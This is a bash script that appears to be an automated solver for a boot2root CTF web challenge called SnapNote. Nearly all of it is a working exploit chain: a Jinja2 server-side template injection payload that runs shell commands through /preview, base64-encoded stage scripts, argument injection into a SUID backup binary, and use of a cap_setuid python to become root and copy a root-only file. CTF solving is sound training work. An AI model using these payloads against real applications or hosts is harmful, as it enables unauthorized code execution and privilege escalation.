#!/usr/bin/env bash
# Automated end-to-end solver for boot2root-webapp (SnapNote).
#
# Drives the whole privesc chain purely through the HTTP SSTI at /preview (no
# interactive shell, no outbound connection needed):
#
#   Jinja2 SSTI (www)  ->  SUID notebackup arg-injection (svc)
#                      ->  /opt/maint/python3 cap_setuid+ep -> os.setuid(0)
#                      ->  copy /root/flag to a www-readable path  ->  read it
#
# Usage: ./solve.sh http://HOST:PORT
set -euo pipefail

BASE="${1:?usage: solve.sh http://HOST:PORT}"
BASE="${BASE%/}"

# rce CMD  -- run CMD as www via the SSTI and echo the raw reflected response
# (the command's stdout is html-escaped into the page; NCTF{...} survives
# verbatim, so callers can grep the raw body).
rce() {
    local note="{{ lipsum.__globals__.os.popen(\"$1\").read() }}"
    curl -s -m 15 -G "$BASE/preview" --data-urlencode "note=${note}"
}

# --- svc-side payload: runs AS svc; uses the cap_setuid python to become root
# and copy the root-only flag somewhere www can read it. ----------------------
read -r -d '' SVC <<'EOF' || true
/opt/maint/python3 -c 'import os
os.setuid(0)
open("/dev/shm/loot","w").write(open("/root/flag").read())
os.chmod("/dev/shm/loot",0o644)'
EOF
SVC_B64="$(printf '%s' "$SVC" | base64 | tr -d '\n')"

# --- www-side payload: drop the svc script, trigger notebackup with an
# injecting bundle ('#' swallows the trailing ".tgz /srv/notes"). -------------
read -r -d '' WWW <<EOF || true
printf '%s' "$SVC_B64" | base64 -d > /dev/shm/bk.sh
chmod 755 /dev/shm/bk.sh
rm -f /dev/shm/loot
/usr/local/bin/notebackup 'x; sh /dev/shm/bk.sh #' >/dev/null 2>&1
EOF
WWW_B64="$(printf '%s' "$WWW" | base64 | tr -d '\n')"

echo "[*] firing chain through /preview SSTI ..." >&2
rce "echo ${WWW_B64} | base64 -d | sh" >/dev/null || true

echo "[*] reading /dev/shm/loot ..." >&2
FLAG=""
for i in 1 2 3 4 5 6; do
    sleep 1
    OUT="$(rce 'cat /dev/shm/loot 2>/dev/null' || true)"
    FLAG="$(printf '%s' "$OUT" | grep -oE 'NCTF\{[^}]*\}' | head -n1 || true)"
    [ -n "$FLAG" ] && break
done
if [ -n "$FLAG" ]; then
    echo "[+] flag: $FLAG"
else
    echo "[-] no flag recovered; last /preview response:" >&2
    printf '%s\n' "$OUT" >&2
    exit 1
fi
